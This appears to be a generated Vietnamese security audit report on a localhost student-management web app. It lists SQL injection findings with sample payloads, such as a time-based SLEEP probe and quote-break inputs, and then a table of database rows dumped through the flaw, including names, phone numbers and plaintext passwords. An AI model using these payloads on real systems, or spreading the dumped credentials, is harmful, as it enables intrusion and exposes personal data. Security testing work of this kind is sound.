@@ -1,0 +1,203 @@
+
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="utf-8">
+<title>Security Audit Report</title>
+<style>
+    body {
+        font-family: 'Segoe UI', sans-serif;
+        margin: 40px;
+        background: #f4f6f8;
+    }
+    h1, h2, h3, h4 {
+        margin-top: 20px;
+    }
+    .header {
+        background: #2c3e50;
+        color: white;
+        padding: 25px;
+        border-radius: 10px;
+    }
+    .vuln-card {
+        background: white;
+        padding: 20px;
+        margin: 15px 0;
+        border-radius: 10px;
+        border-left: 6px solid #e74c3c;
+        box-shadow: 0 2px 6px rgba(0,0,0,0.1);
+    }
+    table {
+        border-collapse: collapse;
+        width: 100%;
+        margin-top: 10px;
+    }
+    th, td {
+        border: 1px solid #ccc;
+        padding: 6px 10px;
+        font-size: 13px;
+    }
+    th {
+        background: #34495e;
+        color: white;
+    }
+    .data-box {
+        background: #ecf0f1;
+        padding: 15px;
+        border-radius: 6px;
+        font-family: Consolas, monospace;
+        margin-bottom: 15px;
+    }
+    .footer {
+        margin-top: 40px;
+        font-size: 12px;
+        color: #666;
+        text-align: center;
+    }
+</style>
+</head>
+<body>
+
+<div class="header">
+    <h1>Security Audit Report</h1>
+    <p><b>Mục tiêu:</b> http://localhost/qlsinhvien/</p>
+    <p><b>Thời gian:</b> 2025-12-21 20:06:50</p>
+</div>
+<h2>Danh sách lỗ hổng phát hiện</h2>
+<div class="vuln-card">
+    <h3>SQLi POST (Time-based)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=3</p>
+    <p><b>Tham số:</b> user (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27; AND SLEEP(5)-- -</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> fn (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> fn (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> ad (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> ad (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> tel (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> tel (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> em (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> em (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> u (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> u (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> ps (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;</code>
+    </p>
+</div>
+
+<div class="vuln-card">
+    <h3>SQLi (MySQL Error)</h3>
+    <p><b>URL:</b> http://localhost/qlsinhvien/index.php?op=5</p>
+    <p><b>Tham số:</b> ps (POST)</p>
+    <p><b>Payload mẫu:</b>
+        <code>&#x27;)</code>
+    </p>
+</div>
+<h2>Dữ liệu đã khai thác</h2><h3>Database: db_sinhvien</h3>
+<h4>Table: account (15 rows)</h4>
+<table>
+<tr>
+<th>cusid</th><th>email</th><th>power</th><th>address</th><th>fullname</th><th>password</th><th>username</th><th>phonenumber</th></tr><tr><td>1</td><td>nch@yahoo.com</td><td>admin</td><td>65-Nguyen Qui Duc</td><td>Nguyen Cong Hoang</td><td>admin</td><td>Admin</td><td>0905002124</td></tr><tr><td>3</td><td>linh@yahoo.com</td><td>user</td><td>108 Ho Xuan Huong</td><td>Nguyen Ngoc Linh</td><td>123</td><td>linhlogin</td><td>0906123321</td></tr><tr><td>6</td><td>songa@yahoo.com</td><td>user</td><td>Quang Binh</td><td>Ha Duy Son</td><td>123456</td><td>sonlogin</td><td>0901002003</td></tr><tr><td>7</td><td>123@123</td><td>user</td><td>65nqd</td><td>nchoang</td><td>123456</td><td>hlogion</td><td>012345</td></tr><tr><td>8</td><td>tien@Yahoo.com</td><td>user</td><td>CDCN</td><td>Nguyen Cong Tien</td><td>123456</td><td>tienlogin</td><td>0123123321</td></tr><tr><td>9</td><td>hoang@yahoo.com</td><td>user</td><td>65 NQD</td><td>Nguyen Hoang</td><td>123456</td><td>hoang123login</td><td>0905939390</td></tr><tr><td>10</td><td>123@yahoo</td><td>user</td><td>123</td><td>NK</td><td>123456</td><td>kienlogin</td><td>123123123</td></tr><tr><td>11</td><td>212@ayhoo</td><td>user</td><td>?a</td><td>sda</td><td>123</td><td>dung</td><td>122121</td></tr><tr><td>12</td><td>nttking</td><td>user</td><td>nttking</td><td>nttking</td><td>nttking</td><td>nttking</td><td>313</td></tr><tr><td>13</td><td>test</td><td>user</td><td>test</td><td>,test,test,test
+25,test,user,test,test,test,</td><td>test</td></tr><tr><td>26</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td>1</td><td>test</td></tr><tr><td>27</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td>&quot;&gt;&lt;img src=x onerror=aler</td><td>test</td></tr><tr><td>39</td><td>&lt;blank&gt;</td><td>user</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td><td>&lt;blank&gt;</td></tr><tr><td>101</td><td>test</td><td>user</td><td>test</td><td>test</td><td>test</td><td> AND (SELECT 5 FROM PG_SL</td><td>test</td></tr><tr></tr></table><br>
+<h4>Table: catid (3 rows)</h4>
+<table>
+<tr>
+<th>catid</th><th>cat</th></tr><tr><td>1</td><td>Thông báo</td></tr><tr><td>2</td><td>Tin T?c</td></tr><tr></tr></table><br>
+<h4>Table: text (1 rows)</h4>
+<table>
+<tr>
+<th>catid</th><th>textid</th><th>title</th><th>bydate</th><th>content</th><th>username</th></tr><tr></tr></table><br>
+<div class="footer">
+    Generated by Ethical Web Security Suite<br>
+    © 2025
+</div>
+
+</body>
+</html>
